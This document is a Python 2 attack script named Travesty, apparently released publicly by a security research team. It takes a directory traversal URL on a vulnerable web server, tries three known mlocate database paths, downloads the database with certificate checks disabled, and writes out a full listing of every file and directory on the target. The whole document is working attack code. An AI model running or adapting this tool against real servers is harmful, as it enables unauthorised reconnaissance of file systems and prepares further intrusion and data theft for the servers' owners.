# Travesty v1.0 - Messyboy Release
# Telspace Systems Research Team (idea and execution by dino@telspace.co.za and manny@telspace.co.za)
# Thanks to https://github.com/salexan2001/pymlocate - this is required for travesty to work.
import pymlocate
from urllib2 import Request, urlopen, URLError
import argparse
import sys
import ssl
reload(sys)
sys.setdefaultencoding('utf8')

parser = argparse.ArgumentParser(description='This is a public release Travesty script - Telspace Systems')
parser.add_argument('-t','--traversal', help='Traversal URL - in full - i.e. https://www.domain.com/../../../../',required=True)
parser.add_argument('-o','--output',help='Output file name', required=True)
args = parser.parse_args()

print ("\r\n\033[34m Telspace Systems Travesty script - PR v1.0 - External Release\r\n\033[0m")
print ("======================================================================")
print ("a false, absurd, or distorted representation of something.... travesty")
print ("======================================================================")
print ("Traversal URL: %s" % args.traversal )
print ("Output filename: %s" % args.output )
print ("======================================================================")


def store(path):
        url = Request(path)
        file_name = 'mlocate.db'
        u = urlopen(url,context=ssl._create_unverified_context())
        f = open(file_name, 'wb')
        meta = u.info()
        file_size = int(meta.getheaders("Content-Length")[0])
        print "Downloading: %s Bytes: %s" % (file_name, file_size)

        file_size_dl = 0
        block_sz = 8192
        while True:
                buffer = u.read(block_sz)
                if not buffer:
                        break

                file_size_dl += len(buffer)
                f.write(buffer)
                status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
                status = status + chr(8)*(len(status)+1)
                print status,

        f.close()


def testcase(test,URL):
	fURL = URL + "/" + test
	req = Request(fURL)
	try:
    		response = urlopen(fURL,context=ssl._create_unverified_context())
		print "The HTTP banner is: ", response.info()['server']
	        print "The full URL is: ", response.geturl()
        	print ("======================================================================")
        	print ("No HTTP Error codes! Downloading Mlocate via traversal...\r\n\r\n")
        	print ("======================================================================")
		store(fURL)
	except URLError, e:
    		if hasattr(e, 'reason'):
			if e.reason == "Not Found":
        			print 'We cant download the file/reach the server.'
        			print 'Reason: ', e.reason
			else:
				print "Server is down, I repeat server is down."
				print "Exiting..."
				sys.exit()
    		elif hasattr(e, 'code'):
        		print 'The server could not fulfill the request.'
        		print 'Error code: ', e.code

def dirty():
        print ("\033[92mmlocate DB Successfully downloaded!\r\n")
        print ("On to the dirty work...\r\n\033[0m")
        ml = pymlocate.open_locate_db("mlocate.db", True)

        for x in range(0,len(ml)):
                savefile = open(args.output, 'a+') 
                savefile.write("\r\n=====================================================\r\n")
                savefile.write("\r\nLISTING FILES IN PATH: \r\n" + ml[x].dirname)
                savefile.write("\r\n=====================BEGIN===========================\r\n")

                if len(ml[x].subentries) == 0:
                        savefile.write("No files in path")

                for y in range(0,len(ml[x].subentries)):
                        savefile.write("\r\n")
                        savefile.write(ml[x].subentries[y].filename)
                savefile.write("\r\n")
                savefile.close()
        print ("======================================================================")
        print ("Done. File downloaded, formatted and saved to file named:\033[92m %s" %args.output)
        print ("\033[0mw00t w00t, check your outputfile and good luck, bye bye\r\n")


paths = ["mlocate.db", "/var/lib/mlocate/mlocate.db", "/var/cache/locate/locatedb"]
for test in paths:
        print "Testing if Path %s exists." % test
        testcase(test,args.traversal)

dirty()
